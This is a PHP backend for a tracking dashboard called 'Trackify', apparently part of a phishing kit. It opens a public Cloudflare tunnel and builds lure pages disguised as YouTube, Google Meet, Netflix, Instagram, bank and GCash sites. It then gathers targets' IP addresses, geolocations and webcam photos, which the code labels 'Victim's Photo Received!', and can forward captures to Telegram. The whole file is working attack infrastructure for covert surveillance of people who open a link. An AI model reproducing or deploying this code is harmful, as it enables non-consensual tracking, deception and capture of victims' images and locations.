<?php
/**
 * Trackify Dashboard API
 * Handles link generation, captures, and status
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

$baseDir = dirname(__DIR__);
chdir($baseDir);

$action = $_GET['action'] ?? '';

switch ($action) {
    case 'start':
        handleStart();
        break;
    case 'stop':
        handleStop();
        break;
    case 'link':
        handleLink();
        break;
    case 'captures':
        handleCaptures();
        break;
    case 'status':
        handleStatus();
        break;
    case 'terminal':
        handleTerminal();
        break;
    case 'telegram':
        handleTelegram();
        break;
    default:
        echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
}

function handleStart() {
    global $baseDir;
    
    $template = $_POST['template'] ?? '2';
    $ytVideoId = $_POST['yt_video_id'] ?? 'dQw4w9WgXcQ';
    $telegram = isset($_POST['telegram']) ? (bool)$_POST['telegram'] : false;
    $botToken = $_POST['bot_token'] ?? '';
    $chatId = $_POST['chat_id'] ?? '';
    
    file_put_contents($baseDir . '/dashboard_config.json', json_encode([
        'template' => $template,
        'yt_video_id' => $ytVideoId
    ]));
    
    if ($telegram && (!empty($botToken) || !empty($chatId))) {
        $config = [
            'bot_token' => $botToken,
            'chat_id' => $chatId
        ];
        file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT));
    }
    
    $sendlink = $baseDir . '/sendlink';
    @unlink($sendlink);
    
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $cloudflared = $baseDir . DIRECTORY_SEPARATOR . ($isWin ? 'cloudflared.exe' : 'cloudflared');
    if (!file_exists($cloudflared)) {
        $cloudflared = $isWin ? 'cloudflared.exe' : 'cloudflared';
    } else {
        $cloudflared = '"' . $cloudflared . '"';
    }
    
    $cmd = $cloudflared . ' tunnel --url http://localhost:3333';
    
    if ($isWin) {
        $fullCmd = 'start /B cmd /c "cd /d ' . $baseDir . ' && ' . $cmd . ' > sendlink 2>&1"';
        pclose(popen($fullCmd, 'r'));
    } else {
        exec('cd ' . escapeshellarg($baseDir) . ' && nohup ' . $cmd . ' >> sendlink 2>&1 &');
    }
    
    echo json_encode([
        'status' => 'starting',
        'message' => 'Tunnel starting... Poll /api.php?action=link for the URL'
    ]);
}

function handleStop() {
    global $baseDir;
    
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $stopped = [];
    
    if ($isWin) {
        @exec('taskkill /F /IM cloudflared.exe 2>nul', $out, $code);
        if ($code === 0) $stopped[] = 'cloudflared';
        @exec('taskkill /F /IM ngrok.exe 2>nul', $out, $code);
        if ($code === 0) $stopped[] = 'ngrok';
    } else {
        @exec('pkill -f cloudflared 2>/dev/null', $out, $code);
        if ($code === 0) $stopped[] = 'cloudflared';
        @exec('pkill -f ngrok 2>/dev/null', $out, $code);
        if ($code === 0) $stopped[] = 'ngrok';
        @exec('killall cloudflared 2>/dev/null', $out, $code);
        @exec('killall ngrok 2>/dev/null', $out, $code);
    }
    
    $sendlink = $baseDir . '/sendlink';
    if (file_exists($sendlink)) {
        @unlink($sendlink);
    }
    
    echo json_encode([
        'status' => 'success',
        'message' => 'Tunnel stopped',
        'stopped' => $stopped
    ]);
}

function handleLink() {
    global $baseDir;
    
    $sendlink = $baseDir . '/sendlink';
    $link = null;
    
    $config = ['template' => '2', 'yt_video_id' => 'dQw4w9WgXcQ'];
    if (file_exists($baseDir . '/dashboard_config.json')) {
        $config = array_merge($config, json_decode(file_get_contents($baseDir . '/dashboard_config.json'), true) ?: []);
    }
    
    if (file_exists($sendlink) && filesize($sendlink) > 0) {
        $content = file_get_contents($sendlink);
        if (preg_match('/https:\/\/[a-zA-Z0-9\-]+\.trycloudflare\.com/', $content, $m)) {
            $link = $m[0];
            generatePayload($link, $config['template'], $config['yt_video_id']);
        }
    }
    
    echo json_encode([
        'status' => $link ? 'ready' : 'starting',
        'link' => $link
    ]);
}

function generatePayload($link, $template, $ytVideoId) {
    global $baseDir;
    
    $template = (int)$template;
    $templates = [
        1 => 'Youtube.html',
        2 => 'Gmeet.html',
        3 => 'Sensitive.html',
        4 => 'Netflix.html',
        5 => 'Instagram.html',
        6 => 'Bank.html',
        7 => 'GCash.html'
    ];
    
    $templateFile = $templates[$template] ?? 'Gmeet.html';
    $templatePath = $baseDir . '/' . $templateFile;
    
    $templateContent = file_get_contents($baseDir . '/template.php');
    $indexPhp = str_replace('forwarding_link', $link, $templateContent);
    file_put_contents($baseDir . '/index.php', $indexPhp);
    
    $htmlContent = file_get_contents($templatePath);
    $htmlContent = str_replace('forwarding_link', $link, $htmlContent);
    
    if ($template === 1) {
        $htmlContent = str_replace('live_yt_tv', $ytVideoId, $htmlContent);
    }
    
    file_put_contents($baseDir . '/index2.html', $htmlContent);
}

function handleCaptures() {
    global $baseDir;
    
    $data = ['geolocations' => [], 'ips' => [], 'photos' => []];
    
    $geoFile = $baseDir . '/geolocations.json';
    if (file_exists($geoFile)) {
        $geo = json_decode(file_get_contents($geoFile), true);
        $data['geolocations'] = is_array($geo) ? array_slice($geo, -50) : [];
    }
    
    $ipFile = $baseDir . '/saved.ip.txt';
    if (file_exists($ipFile)) {
        $content = file_get_contents($ipFile);
        $entries = [];
        $lines = explode("\n", $content);
        $current = [];
        foreach ($lines as $line) {
            if (preg_match('/IP:\s*(.+)/', $line, $m)) $current['ip'] = trim($m[1]);
            if (preg_match('/Time:\s*(.+)/', $line, $m)) $current['time'] = trim($m[1]);
            if (!empty($current['ip']) && !empty($current['time'])) {
                $entries[] = $current;
                $current = [];
            }
        }
        $data['ips'] = array_slice($entries, -20);
    }
    
    $data['photos'] = [];
    $folders = glob($baseDir . '/20*', GLOB_ONLYDIR);
    foreach (array_reverse($folders) as $folder) {
        $imgs = glob($folder . '/cam*.png');
        foreach (array_slice($imgs, -5) as $img) {
            $data['photos'][] = basename(dirname($img)) . '/' . basename($img);
        }
    }
    
    echo json_encode(['status' => 'success', 'data' => $data]);
}

function handleStatus() {
    global $baseDir;
    
    $sendlink = $baseDir . '/sendlink';
    $hasLink = file_exists($sendlink) && filesize($sendlink) > 0;
    $link = null;
    if ($hasLink) {
        $content = file_get_contents($sendlink);
        if (preg_match('/https:\/\/[a-zA-Z0-9\-]+\.trycloudflare\.com/', $content, $m)) {
            $link = $m[0];
        }
    }
    
    $telegramConfig = $baseDir . '/telegram_config.json';
    $telegramEnabled = file_exists($telegramConfig);
    
    echo json_encode([
        'status' => 'success',
        'tunnel_active' => (bool)$link,
        'link' => $link,
        'telegram_configured' => $telegramEnabled
    ]);
}

function handleTerminal() {
    global $baseDir;
    
    $events = [];
    
    if (file_exists($baseDir . '/location_notify.txt')) {
        $content = file_get_contents($baseDir . '/location_notify.txt');
        $events[] = ['type' => 'location', 'content' => $content];
        @unlink($baseDir . '/location_notify.txt');
    }
    
    if (file_exists($baseDir . '/ip.txt')) {
        $content = file_get_contents($baseDir . '/ip.txt');
        $events[] = ['type' => 'ip', 'content' => $content];
        @file_put_contents($baseDir . '/saved.ip.txt', $content . "\n", FILE_APPEND | LOCK_EX);
        @unlink($baseDir . '/ip.txt');
    }
    
    if (file_exists($baseDir . '/Log.log')) {
        $events[] = ['type' => 'photo', 'content' => 'Victim\'s Photo Received!'];
        @unlink($baseDir . '/Log.log');
    }
    
    echo json_encode(['status' => 'success', 'events' => $events]);
}

function handleTelegram() {
    global $baseDir;
    
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);
        return;
    }
    
    $input = json_decode(file_get_contents('php://input'), true) ?: $_POST;
    $botToken = $input['bot_token'] ?? '';
    $chatId = $input['chat_id'] ?? '';
    
    if (empty($botToken) || empty($chatId)) {
        echo json_encode(['status' => 'error', 'message' => 'bot_token and chat_id required']);
        return;
    }
    
    $config = ['bot_token' => $botToken, 'chat_id' => $chatId];
    file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT));
    
    echo json_encode(['status' => 'success', 'message' => 'Telegram config saved']);
}
